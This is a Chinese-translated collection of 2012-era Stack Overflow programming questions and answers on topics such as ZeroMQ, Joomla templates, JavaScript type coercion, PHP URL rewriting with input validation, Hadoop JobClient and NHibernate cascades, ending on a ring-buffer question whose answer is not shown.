如何在 0MQ 中创建 N 到 N（或 N 到 1 到 N）模式来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-11T02:36:29.507

0MQ 自动允许 N 到 M 个网络；只需将每个订阅者连接到每个发布者。这可能会成为管理负担，在这种情况下，您可以使用所有发布者和订阅者都连接到的简单代理，请参阅[http://zguide.zeromq.org/page:all#toc36](http://zguide.zeromq.org/page:all#toc36)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T14:23:17.647

图案？发布者将接受任意数量的订阅者，并且您的订阅者可以[连接](http://api.zeromq.org/2-2%3azmq-connect)到多个发布者。我在这里没有看到任何问题，请继续执行。

将来，也许通过陈述您想要完成的事情而不是您认为应该如何完成来为您提供更好的服务。仅仅将一堆订阅者连接到一堆发布者可能不是处理你正在做的任何事情的最佳方式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-10T16:40:29.310

我在 C 中做了一个简单的示例，它使用内置的 zmq 转发器设备将消息从 N 个发布者转发到 N 个订阅者。该代码可在[https://gitorious.org/hellozmq获得](https://gitorious.org/hellozmq)

# html - 使 joomla 模块跨越多列

> ID：12264063
> 
> 赞同：0
> 
> 时间：2012-09-04T13:02:58.810
> 
> 标签：html, css, joomla, module, position

我一直在网上搜索并在这里寻找我的问题的答案，但无济于事。

我的网页在 Joomla 1.5 上运行，并且首页目前有一个 3 列/位置布局，我可以在其中放置模块。

但是，我想要一个跨越两个最右边位置的模块，同时将它们下方的模块保持在常规的“三列布局”中。即这就是我希望它看起来的样子：

[模块][--------模块------]

[模块][模块][模块]

[模块][模块][模块]

我的猜测是我需要定义一个跨越两列的新位置。是这样吗？如果我想确保新的、更宽的模块下方的模块仍处于其常规布局中，我该怎么做？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:22:37.537

是的，这可以在模板中完成，例如使用 countmodules() 来查看是否要显示位置并相应地排列位置，例如，以下显示了如何根据 if 设置一个可以有一列或两列的页面一个模块被放入“右”列。如果“右”列中有模块，则显示两个 div（用于调整它们大小的 css），如果右列中没有任何内容，则显示全宽主列。

```
<?php if($this->countModules('right')) : ?>
<div id="divMainContent">
    <jdoc:include type="modules" name="user9" style="xhtml" />
    <jdoc:include type="component" />
    <jdoc:include type="modules" name="bottombanner" style="xhtml" />
</div> <!-- end maincontent -->
<div id="divRight">
    <jdoc:include type="modules" name="right" style="xhtml" />
    <jdoc:include type="modules" name="banner" style="xhtml" />
</div>
<?php else: ?>
    <div id="divMainContentWide">
        <div id="divTopWide">
            <jdoc:include type="modules" name="user9" style="xhtml" />
        </div>
    </div>
<?php endif; ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:26:52.943

这取决于您的模板。joomla 驱动的网站上的东西被放置在位置。

在任何情况下，如果您要隐藏的那个位置是在一个带有类的 div 中，比如说

```
display: none 
```

然后给其他 2 个模块 50% 的宽度，如果它们还没有，则将它们向左浮动。

```
float: left;
width:50% 
```

您可能还想在那之后（在 3 列开始之前）清除浮动，方法是创建一个带有 clear 类的 div 并清除浮动：

```
clear:both; 
```

# javascript - 为什么`{} + 1` 在 Chrome 和 Firefox 中获得数字 1，但在 Node.js 中获得字符串 '[object Object]1'？

> ID：12264065
> 
> 赞同：4
> 
> 时间：2012-09-04T13:03:10.290
> 
> 标签：javascript, node.js, firefox, google-chrome

Javascript中的加法真的很棒。
在 Chrome 和 Firefox 中，`{} + 1`等于数字 1；但在 Node.js 中，`{} + 1`等于字符串 '[object Object]1'。另一方面，`1 + {}`在浏览器和 Node.js 中都等于 '1[object Object]'。
谁能解释为什么`{} + 1`在浏览器中等于 1？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-04T13:08:49.337

这有点复杂。发生这种情况是因为大多数 JavaScript 引擎将其解释`{}`为代码块，而不是对象。因此`{}+1`与 基本相同`+1`。如果你这样做（例如）

```
({}+1}) 
```

那么括号内的代码`()`将被解释为表达式，而不是代码块。从而`{}`成为一个实际的对象。

阅读本文了解更多详情：

[http://www.2ality.com/2012/01/object-plus-object.html](http://www.2ality.com/2012/01/object-plus-object.html)

文章还解释了为什么它在 Node.Js 中有所不同。

# php - 从 URL 抓取 HEX - PHP

> ID：12264071
> 
> 赞同：0
> 
> 时间：2012-09-04T13:03:22.430
> 
> 标签：php, html, css

如果有人在 URL 的末尾添加一个十六进制值，我想这样做，我可以向他们显示某个页面。

例如，假设我有colors.com，我想要它，所以如果有人想访问colors.com/FF0000，它会在页面上显示那个十六进制。是否可以从 URL 中获取并显示它，尽管我希望它只是十六进制值。

删除某些字母和特殊字符，这样别人就不能只使用文本。

希望这是有道理的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:07:25.777

您需要使用 Web 服务器的 URL 重写来匹配看起来像十六进制颜色（6 个字母 AF 和数字 0-9）的模式并进行相应的路由。

Apache mod_rewrite 示例以静默方式重写`example.com/AA00FF`为`example.com/index.php?color=AA00FF`：

```
RewriteEngine On
# [A-Fa-f0-9]{6} matches six letters A-F and digits 0-9.
RewriteRule ^([A-Fa-f0-9]{6})$ index.php?color=$1 [L] 
```

在您的 PHP 脚本`index.php`中，从`$_GET['color']`. 您还需要在 PHP 中为该正则表达式验证它。否则，您将面临 XSS 攻击的风险：

```
// You MUST validate it in PHP as well, to avoid XSS attacks when you insert it into HTML
if (preg_match('/^[A-Z0-9]{6}$/i', $_GET['color'])) {
  // ok to use
}
else {
  // Invalid hex color value. Don't use it!
} 
```

我并不是说这是一个好主意，但是要设置主体颜色，您可以这样做：

```
// Last warning: DON'T DO THIS UNLESS YOU HAVE VALIDATED WITH THE REGEX ABOVE!
echo "<body style='background-color: #{$_GET['color']}'>"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:06:15.860

假设服务器将 URL 映射到您的脚本，您可以从`$_SERVER['REQUEST_URI']`.

您可以使用简单的正则表达式确保它是十六进制 rgb 颜色。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:15:16.670

有可能抓住它是的。这需要：

.htaccess 文件，类似这样的文件，位于 colors.com 的根文件夹中：

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /index.php/$1 [L] 
```

包含以下内容的 index.php 文件：

```
// Get color from PATH_INFO in url.
$color = substr($_SERVER['PATH_INFO'], 1);
// If color is not a valid color hex code.
if(!preg_match('/^[a-fA-F0-9]{6}$/i', $color)){
    die("NOT VALID");
}

echo $color; // Prints 00FFFF if url is color.com/00FFFF 
```

# c# - 如何运行像 ShowDialog() 这样的进程？

> ID：12264073
> 
> 赞同：-2
> 
> 时间：2012-09-04T13:03:37.750
> 
> 标签：c#

我有两个程序。“程序 1”和“程序 2”。“Programm2”从“Рrogramm1”运行。我使用以下代码运行“Programm2”：

```
Process.Run("D://Programms//calc.exe"); 
```

是否可以运行“Рrogramm2”，以便“Рrogramm1”仍然可以使用但不能在“Рrogramm2”工作时关闭。

我可以这样做`Process.Run()`吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T13:07:51.510

`Process`您可以通过检查[`YourProcess.HasExited`](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.hasexited.aspx)属性（可能在表单的`Unloading`事件中）来判断使用该类启动的进程是否已退出。

如果你想阻塞并等待一个进程退出，你可以使用该[`YourProcess.WaitForExit()`](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.waitforexit.aspx)方法。

[您可以在 MS KB305369](http://support.microsoft.com/kb/305369)中找到此示例和更多信息。

# android - 如何在android中使用json解析器加速从服务器同步json数据？

> ID：12264078
> 
> 赞同：1
> 
> 时间：2012-09-04T13:04:00.933
> 
> 标签：android, android-syncadapter

# **使用 json 解析器从服务器同步数据**

   我已经为离线概念开发了 android 应用程序。当互联网连接超过 4000 条从服务器同步的记录时。如果我在服务器中只添加一个数据。当我第二次同步时，要从服务器同步的特定数据。我的问题是当我第二次同步数据时，它与第一次同步所用的时间相同。如何避免这种情况，请告诉我。
  同步工作正常。但是如果我第二次按下同步按钮。整个数据可以再次同步。请详细说明。我有一点想法，我不知道它是否正确。

## **我的建议：**

  在服务器端和客户端设置的标志。如果数据同步标志设置为0。如果数据新同步它应该设置为1。
 如果数据丢失。不幸的是，应用程序中清除了数据缓存。这个怎么做？。请解释一下。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:11:46.540

查看[此视频](http://www.youtube.com/watch?v=xHXn3Kg2IQE) googler 在这里解释了如何构建 REST 应用程序 - 同步有很多有用的东西。

如果您自己构建服务器和客户端 - 您可以存储最后一次连接的时间戳，并且每次同步时，您都会将此时间传递给服务器并依赖它，您只能传递修改后的列（您必须存储数据修改的时间戳或来自关键时间戳的修改列列表）

# actionscript-3 - AS3 - 来自库的 Addchild

> ID：12264084
> 
> 赞同：1
> 
> 时间：2012-09-04T13:04:36.463
> 
> 标签：actionscript-3

我想将库中的影片剪辑添加到舞台上的影片剪辑中。

```
function setMc(con:Sprite,mc:Sprite):void
{
    con.addChild(mc)
    mc.x=mc.width/2
    mc.y=mc.height/2
}        

setMc(myholder,mylibrarymc) 
```

我收到此错误：

> TypeError：错误 #1034：类型强制失败

我需要改变什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:11:19.980

库仅包含原型，不包含实际对象。我假设“mylibrarymc”是库中 MC 类型的名称。在这种情况下，“mylibrarymc”是 Class 类型，使用方式不同。

```
function setMc(con:Sprite,mc:Class):void
{
    var newMC:DisplayObject=new mc() as DisplayObject;
    // Here you actually make an object out of a class
    con.addChild(newMC);
    newMC.x=newMC.width/2;
    newMC.y=newMC.height/2;
}        

setMc(myholder,mylibrarymc); 
```

希望这可以帮助。我涉足图书馆已经有一段时间了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:09:41.847

您的函数需要一个 Sprite，并且您可能正在向它传递一个 MovieClip。查看在库中右键单击 mc 时的“export for actionscript”选项

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:11:52.973

右键单击库中的对象并转到“属性”。确保选中标有“Export for ActionScript”的框并为其指定适当的名称。你给符号的类名是你在代码本身中创建该类型对象的名称，例如：

为 ActionScript 导出一个类名为“Player”的元件。

在您的 ActionScript 文件中：

```
var player = new Player();
addChild(player); 
```

您可以使用任何 MovieClip 成员函数（位置、alpha）来操作对象并分配事件侦听器以使其具有交互性。

# c# - ASP.NET Web API - 返回 CLR 对象或 HttpResponseMessage

> ID：12264088
> 
> 赞同：16
> 
> 时间：2012-09-04T13:04:43.100
> 
> 标签：c#, .net, asp.net-web-api

Web API 中针对操作方法的返回类型的一般做法是什么？

像这样返回 CLR 对象：

```
public IEnumerable<ContactModel> Get()
{
    return _contactService.GetAllForUser();
} 
```

或将您的对象包装在`HttpResponseMessage`：

```
public HttpResponseMessage Get()
{
    IEnumerable<ContactModel> contacts = _contactService.GetAllForUser();

    return Request.CreateResponse((HttpStatusCode) 200, contacts);
} 
```

我更喜欢将我自己的 CLR 对象作为返回类型，因为它显然会产生更简洁的方法，因为您不必`HttpResponseMessage`每次都在实例化 a 时搞砸。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-04T14:55:44.290

这里重要的一点是，这个选择是**PREFERENCE**的问题。如果您正在创建一个“URI 样式”HTTP api，其中返回类型是客户端预先知道的，那么这可能是您的首选方法。

但是，就我个人而言，我不喜欢返回 CLR 类型。我相信，通过这种方法，您可能会失去 HTTP 的许多好处。我总是返回 HttpResponseMessage。

如果考虑标准过程调用，则有两种可能的结果，即返回返回类型或出现异常。由于重定向、临时不可用的服务器、无内容、未修改、服务器连接、首选标头变体等，HTTP 交互要灵活得多。

我认为 ApiController 类是您的应用程序有机会将面向对象的方法调用映射到 HTTP 请求/响应的地方。我认为明确地进行这种映射有助于利用 HTTP。让框架神奇地将 CLR 类型转换为某种有线表示，确实节省了一些输入，但它掩盖了正在发生的事情，并迫使您通过 ActionFilters 和 MessageHandlers 间接地进行任何类型的 HTTP 交互。

我没有兴趣说服希望返回 CLR 类型进行更改的人，我只是想再次向喜欢返回 HttpResponseMessage 想法的人保证，尽管您不会看到很多示例，但它是一个完全可行的选择那。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-04T13:09:46.137

我认为第一个选项是最好的。在任何情况下，如果没有错误，返回码将为 200，无需您进行任何设置。

如果有任何异常，您可以`HttpResponseException`使用适当的代码和消息抛出

```
throw new HttpResponseException(
    Request.CreateResponse<string>(HttpStatusCode.BadRequest, 'Your message')) 
```

# macos - 我需要一个在 mac 上使用 GLKit 框架的 OpenGL 演示，演示使用 GLKBaseEffect 进行渲染

> ID：12264090
> 
> 赞同：12
> 
> 时间：2012-09-04T13:04:54.810
> 
> 标签：macos, osx-mountain-lion, opengl-3, glkit

我正在尝试使用 for 制作一个简单的应用程序`GLKit`，`OSX 10.8`但找不到任何示例。Apple 文档只是从复制`iOS`到`Mac`没有实际示例。我有一个`3.2 profile`设置的上下文，还有一个`CVDisplayLink`用于绘图的上下文，但什么都没有。我正在尝试从`iOS`（也用`GlKit`）移植一些简单的绘图。任何帮助，将不胜感激。谢谢。

# c++ - GTK 输入到整数转换

> ID：12264091
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:04:59.767
> 
> 标签：c++, string, gtk, gtkentry

如何从 gtk 条目小部件中获取文本，然后将其转换为整数值。请注意，在我的代码中，我包含了一个名为 Window 的包装器结构，其中包含指向小部件的指针。主要是，我声明一个 Window 的实例，然后使用适当的 GTK 函数调用构建正确的小部件。然后我将该窗口对象传递给处理单击操作的函数。然后我想以整数格式计算分子除以分母。下面是我的尝试。除 button_clicked 函数外，所有代码都有效。有任何想法吗？

```
#include <gtk/gtk.h>
#include <stdlib.h>

struct Window
{
    GtkWidget *numerator;
    GtkWidget *denominator;
    GtkWidget *button;
    GtkWidget *label;
};

void button_clicked(GtkWidget *widget, gpointer data)
{
    Window* w = (Window*)data;
    char buf[10];

    char buffer[200];

    GtkEntry* e = (GtkEntry*)w->numerator;
    const gchar* entry1 = gtk_entry_get_text(e);

    char* test = (char*)gchar;
    int r = atoi(test);

    sprintf(buf,"%d",r);

    GtkWidget *label = w->label;
    gtk_label_set_text(GTK_LABEL(label), buf);
}

int main(int argc, char*argv[])
{
    GtkWidget *window;
    GtkWidget *table;
    Window w;

    //Set up my window
    gtk_init(&argc,&argv);
    window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "Division");
    gtk_window_set_default_size(GTK_WINDOW(window),500,500);
    gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);

    //Create my table and add it to the window
    table = gtk_table_new(4,2,FALSE);
    gtk_container_add(GTK_CONTAINER(window),table);

    //Create instances of all my widgets
    w.numerator = gtk_entry_new();
    w.denominator = gtk_entry_new();
    w.button = gtk_button_new_with_label("Click");
    w.label = gtk_label_new("result");

    //Attack the widgets to the table
    gtk_table_attach(GTK_TABLE(table), w.numerator,0,1,0,1,GTK_FILL,GTK_FILL,5,5);
    gtk_table_attach(GTK_TABLE(table), w.denominator,0,1,1,2,GTK_FILL,GTK_FILL,5,5);
    gtk_table_attach(GTK_TABLE(table), w.button,0,1,2,3,GTK_FILL,GTK_FILL,5,5);
    gtk_table_attach(GTK_TABLE(table), w.label,0,1,3,4,GTK_FILL,GTK_FILL,5,5);

    //attach the click action to with the button to invoke the button_clicked function
    g_signal_connect(G_OBJECT(w.button),"clicked",G_CALLBACK(button_clicked),&w);   
      g_signal_connect_swapped(G_OBJECT(window),"destroy",G_CALLBACK(gtk_main_quit),NULL);

    gtk_widget_show_all(window);

    gtk_main();

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:18:55.390

如果我没看错，在您的“测试代码”中，您要做的就是将标签字符串设置为“w->numerator”的内容，对吗？

线

```
char* test = (char*)gchar; 
```

对我来说看起来很可疑，甚至没有编译，它看起来像是一个错字。将“gchar”更改为“entry1”，它应该做你想做的事。

不过我有一个建议给你：使用[**GtkSpinButton**](http://developer.gnome.org/gtk/2.24/GtkSpinButton.html)而不是 GtkEntry。它就像为数值制作的自定义条目，并且检索这样的数值要容易很多倍。

# c++ - 有方法的类，我不明白类的样子

> ID：12264095
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:05:13.290
> 
> 标签：c++, class, struct

我正在阅读“Learn C the Hard Way”一书，并在那里找到了一个看起来像这样的代码片段（下面是我的代码，但程序的结构是相同的）：

```
#include <iostream>
#include <string>

using namespace std;

class Person {
private:
    string name;
    int age;
public:
Person(string name, int age) {;
        this->name = name;
        this->age = age;
    }

~Person() {
    }
};

// When whould I do like this?
class Person *Create_person(string name, int age) {
    class Person *person = new Person(name, age);
    return person;
};    

int main() {
    Person *person = Create_person("John", 30);
} 
```

特别看

```
class Person *Create_person(string name, int age) {
        class Person *person = new Person(name, age);
        return person;
    }; 
```

那是什么样的功能？为什么我会这样称呼它，而不仅仅是`Person *person = new Person`？它是一个简短的形式

```
class Person {
public:
   Person *Create_person(string name, int age){
        Person *person = new Person(name, age);
        return person;
   }
} 
```

?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T13:10:14.567

`Create_person`是一个全局函数，它在空闲存储上创建一个`Person`对象并返回该对象的地址。在这方面，它完全一样`new Person(whatever)`，在这种情况下，完全是多余的。在某些情况下这种函数很方便，所以这可能是对工厂函数的简单介绍。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-04T13:12:46.193

使用`CreatePerson`函数而不是`new` 直接执行的习惯称为工厂方法模式。很少看到它用于没有虚函数的类。`new`它通常在调用代码只看到一个抽象基类，并且对可能被编辑的实际类型一无所知时使用。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-04T13:10:35.247

该功能没有什么特别之处。`class Person`并且`Person`是完全相同的类型。

```
class Person *Create_person(string name, int age) {
    class Person *person = new Person(name, age);
    return person;
}; 
```

和

```
Person *Create_person(string name, int age) {
    Person *person = new Person(name, age);
    return person;
}; 
```

意思相同。无论如何，该功能似乎毫无意义，您可以直接调用`new Person(name, age)`，正如您已经想到的那样。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T13:10:30.530

```
class Person *Create_person(string name, int age) {
        class Person *person = new Person(name, age);
        return person;
    }; 
```

是全局命名空间中的一个函数，它返回一个指向`Person`对象的指针。这里`class`不需要关键字，可以省略。实际上，它*应该*被省略。它存在的原因可能是因为它是“C-style”。

# android - AlertDialog.Builder 运行时异常

> ID：12264098
> 
> 赞同：0
> 
> 时间：2012-09-04T13:05:17.633
> 
> 标签：android, android-alertdialog, runtimeexception

我正在尝试在 BluetoothChatService 中添加一个对话框，如果无法建立或丢失连接，它将提示重试蓝牙连接。执行 AlertDialog.show() 时出现运行时异常；此错误发生在 Handler.java 中，错误为“无法在未调用 Looper.prepare() 的线程内创建处理程序”并且 mLooper 为空。我尝试过在 stackoverflow 上找到的其他解决方案，例如 'new AlertDialog.Builder(Activity.this)'; 没有任何效果。

编辑：似乎线程中的对话方法是问题所在。我将在创建线程的 UI Activity 的约束内重新编码对话框。感谢所有回复。

编码：

```
public class BluetoothChatService {

private Context context;
private final BluetoothAdapter mAdapter;
private int mState;

public BluetoothChatService(Context context) {
    this.context = context;
    mAdapter = BluetoothAdapter.getDefaultAdapter();
    mState = STATE_NONE;
}

private void connectionFailed(String s) {
    // Send a failure message back to the Activity
    stop();
    sendToastMessage(String.format(context.getApplicationContext().getString(R.string.bluetooth_cannot_connect), s));
    createRetryDialog(R.string.bluetooth_cannot_connect, s);
}

// ---------------------------------------------------------------------------------------------
private void createRetryDialog(int msg_id, String err_msg) {
    AlertDialog.Builder alertDialogBuilderRetry;
    alertDialogBuilderRetry = new AlertDialog.Builder(context);
    String message = String.format(context.getApplicationContext().getString(msg_id), err_msg);

    // set title
    alertDialogBuilderRetry.setTitle(context.getApplicationContext().getString(R.string.bluetooth_title_connect_error));

    // set dialog message
    alertDialogBuilderRetry
        .setMessage(message)
        .setCancelable(false)
        .setPositiveButton(context.getApplicationContext().getString(R.string.dialog_button_yes), new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog,int id) {
                // Start the service over to restart listening mode
                initializeBluetooth();
                dialog.dismiss();
            }
        })
        .setNegativeButton(context.getApplicationContext().getString(R.string.dialog_button_no),new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog,int id) {
                // if this button is clicked, just close
                // the dialog box and do nothing
                mState = STATE_NONE;
                dialog.cancel();
            }
        }).create().show();
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:10:39.107

确保当您调用它时，您传递的是活动上下文，而不是应用程序上下文。无法使用应用程序上下文显示对话框。

# java - 对 hadoop 作业跟踪器 api 的困惑

> ID：12264099
> 
> 赞同：20
> 
> 时间：2012-09-04T13:05:28.433
> 
> 标签：java, hadoop, hbase, jobs

我正在尝试从工作跟踪器收集一些信息。对于初学者，我想从获取正在运行的作业信息开始，例如作业 ID 或作业名称等。但是已经卡住了，这就是我所得到的（打印出当前正在运行的作业的作业 ID）：

```
public static void main(String[] args) throws IOException {
        Configuration conf = HBaseConfiguration.create();
        conf.set("hbase.zookeeper.quorum", "zk1.myhost,zk2.myhost,zk3.myhost");
        conf.set("hbase.zookeeper.property.clientPort", "2181");

        InetSocketAddress jobtracker = new InetSocketAddress("jobtracker.mapredhost.myhost", 8021);
        JobClient jobClient = new JobClient(jobtracker, conf);
        JobStatus[] jobs = jobClient.jobsToComplete();

        for (int i = 0; i < jobs.length; i++) {
            JobStatus js = jobs[i];
            if (js.getRunState() == JobStatus.RUNNING) {
                JobID jobId = js.getJobID();
                System.out.println(jobId);
            }
        }
    } 
```

在尝试显示作业 ID 时，**上面的内容很有效，但现在我也想显示作业名称。**所以我在打印作业 id 后添加了这一行：

```
System.out.println(jobClient.getJob(jobId).getJobName()); 
```

我得到这个例外：

```
Exception in thread "main" java.lang.NullPointerException
    at org.apache.hadoop.mapred.JobClient$NetworkedJob.<init>(JobClient.java:226)
    at org.apache.hadoop.mapred.JobClient.getJob(JobClient.java:1080)
    at org.apache.test.JobTracker.main(JobTracker.java:28) 
```

`jobClient`不是`null`。我知道这一点，因为我尝试使用 null check if 语句，但这`jobClient.getJob(jobId)`是`null`. 我在这里做错了什么？

根据API我应该没问题，

[http://hadoop.apache.org/mapreduce/docs/r0.21.0/api/org/apache/hadoop/mapred/JobClient.html#getJob(org.apache.hadoop.mapred.JobID)](http://hadoop.apache.org/mapreduce/docs/r0.21.0/api/org/apache/hadoop/mapred/JobClient.html#getJob(org.apache.hadoop.mapred.JobID))

首先`RunningJob`从 jobClient 获取，而不是在运行作业后获取它的名称[http://hadoop.apache.org/mapreduce/docs/r0.21.0/api/org/apache/hadoop/mapred/RunningJob.html#getJobName()](http://hadoop.apache.org/mapreduce/docs/r0.21.0/api/org/apache/hadoop/mapred/RunningJob.html#getJobName())

以前有人做过这样的事情吗？我可以使用[jsoup](https://stackoverflow.com/questions/tagged/jsoup)通过 GET 请求获取此信息，但我认为这是获取此信息的更好方法。

这里的问题更新是我的 hadoop/hbase 依赖项：

```
<dependency>
            <groupId>org.apache.hadoop</groupId>
            <artifactId>hadoop-client</artifactId>
            <version>0.23.1-mr1-cdh4.0.0b2</version>
        </dependency>
        <dependency>
            <groupId>org.apache.hadoop</groupId>
            <artifactId>hadoop-core</artifactId>
            <version>0.23.1-mr1-cdh4.0.0b2</version>
            <exclusions>
                <exclusion>
                    <groupId>org.mortbay.jetty</groupId>
                    <artifactId>jetty</artifactId>
                </exclusion>
                <exclusion>
                    <groupId>javax.servlet</groupId>
                    <artifactId>servlet-api</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.apache.hbase</groupId>
            <artifactId>hbase</artifactId>
            <version>0.92.1-cdh4b2-SNAPSHOT</version>
        </dependency> 
```

**赏金更新：**

这是我的进口：

```
import java.io.IOException;
import java.net.InetSocketAddress;

import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.hbase.HBaseConfiguration;
import org.apache.hadoop.mapred.JobClient;
import org.apache.hadoop.mapred.JobID;
import org.apache.hadoop.mapred.JobStatus; 
```

这是输出`System.out.println(jobId)`：

```
job_201207031810_1603 
```

当前只有一项作业正在运行。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-07T13:22:01.790

看一下内部`NetworkedJob`类`JobClient`。
（来源：/home/user/hadoop/src/mapred/org/apache/hadoop/mapred/JobClient.java）

它的构造函数尝试从第 225 行获取`Configuration`对象，但它为 null，因为没有设置它：`JobClient``new JobClient(InetSocketAddress jobTrackAddr, Configuration conf)`

```
// Set the completion poll interval from the configuration.
      // Default is 5 seconds.
      Configuration conf = JobClient.this.getConf();
      this.completionPollIntervalMillis = conf.getInt(COMPLETION_POLL_INTERVAL_KEY,
          DEFAULT_COMPLETION_POLL_INTERVAL); //NPE occurs here! 
```

作为一种解决方法，请在创建 JobClient 对象后手动设置它。这将解决您的问题：

```
..
JobClient jobClient = new JobClient(jobtracker, conf);
jobClient.setConf(conf); 
.... 
```

边注：

我`Configuration`通过以下方式实例化了对象：

```
Configuration conf = new Configuration();
conf.addResource(new Path("/path_to/core-site.xml"));
conf.addResource(new Path("/path_to/hdfs-site.xml")); 
```

# ajax - cakephp ajax 远程函数选择输入参数

> ID：12264101
> 
> 赞同：0
> 
> 时间：2012-09-04T13:05:38.420
> 
> 标签：ajax, cakephp, parameters

我尝试在 cakePHP 中做两个输入（类别、子类别）。如果我更改类别输入，我希望 ajax 将值加载到子类别。我能做什么？我使用这样的远程功能：

```
$ajax->remoteFunction( 
        array( 
            'url' => array( 'controller' => 'categories', 'action' => 'loadSubcategories', AND NOW I WANT PUT HERE CATEGORY ID FROM MY INPUT ), 
            'update' => 'subcategories' 
        )
); 

<select name="categories" id="categories" onhange="MY REMOTE FUNCTION">
CATEGORIES
</select>

<select name="subcategories" id="categories" onhange="MY REMOTE FUNCTION">
LOAD SUBCATEGORIES BY CATEGORY ID WITH AJAX
</select> 
```

我希望你能理解我:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T04:49:18.957

所有你需要的是：

1.  根据接收到的数据输出项目列表的 Cake 操作（应该不难）
2.  一些 JS 可以确定选择了哪些类别（您已经拥有）
3.  另一个 JS 打包数据并将其发送到 Cake 动作
4.  另一个 JS 使用您收到的项目列表更新站点

我会看看[jQuery 的 AJAX 函数](http://api.jquery.com/jQuery.post/)来完成这项任务。`$this->data`如果您以这样的格式发布数据，在 Cake中很容易访问它：

```
{
    'data[ModelName][categories]' : $("#category").val()
} 
```

# nhibernate - 删除父对象时如何防止NHibernate以一对多关系加载子集合

> ID：12264102
> 
> 赞同：1
> 
> 时间：2012-09-04T13:05:38.320
> 
> 标签：nhibernate, nhibernate-mapping, cascading-deletes

我有公司-> 用户一对多的关系，我希望在删除公司时级联删除用户。问题是 NHibernate（根据控制台输出：我已将 Nhibernate 配置为将生成的 sql 记录到控制台）首先加载子集合，然后对每个子集合执行删除。如何配置 NHibernate 级联删除子集合而不加载它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:22:04.597

在此处查看此答案：[https ://stackoverflow.com/a/1323461/27343](https://stackoverflow.com/a/1323461/27343)

可能有一些优化空间，但实际上并没有那么糟糕，在某些情况下加载子项甚至更好，而不是试图盲目地执行一些 SQL 删除语句。

NHibernate 支持“on delete cascade”选项

```
<key column="column" on-delete="cascade" /> 
```

但它只在某些情况下有效。它会告诉您何时加载映射文件。

# regex - youtube 的正则表达式

> ID：12264103
> 
> 赞同：0
> 
> 时间：2012-09-04T13:05:40.900
> 
> 标签：regex, youtube, hyperlink

我正在使用此正则表达式将 youtube 链接转换为嵌入式代码：

```
str.replace(/(?:http:\/\/)?(?:www\.)?(?:youtube\.com|youtu\.be)\/(?:watch\?)?(?:.+)v=(.+)/g, '<iframe width="420" height="345" src="http://www.youtube.com/embed/$1" frameborder="0" allowfullscreen></iframe>'); 
```

但是当 youtube 链接的参数超过 v 参数时，它就不起作用了，比如

```
http://www.youtube.com/watch?v=iXVe-efsYWw&feature=g-feat 
```

任何人都可以帮我更改正则表达式以切断任何其他参数吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-06T21:55:58.513

我为此做的最好的正则表达式是这个：

```
~^.*(?:youtu\.be\/|youtube\.com\/(?:[^\?]*\?(?:.*&)?v=|(?:embed|v|user)\/))([^\?&"\'>]{11}).*$~si 
```

将其替换为第 1 组。（\1 或 $1）

希望能帮助到你。为我得到的每个 youtube URL 工作。它对任何人都不起作用，让我知道，我可以让它变得更好。

# c - 在 C 中寻找正确的环形缓冲区实现

> ID：12264104
> 
> 赞同：8
> 
> 时间：2012-09-04T13:05:40.787
> 
> 标签：c, multithreading, producer-consumer, lock-free, circular-buffer

我正在寻找具有以下特征的 C 中的环形缓冲区实现（或伪代码）：

*   多生产者单消费者模式（MPSC）
*   消费者阻塞空
*   生产者完全封锁
*   无锁（我期待高争用）

到目前为止，我一直只使用 SPSC 缓冲区 - 每个生产者一个 - 但我想避免消费者连续旋转以检查其所有输入缓冲区中的新数据（并且可能摆脱我的一些编组线程系统）。

我在英特尔机器上为 Linux 开发。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T07:39:47.343

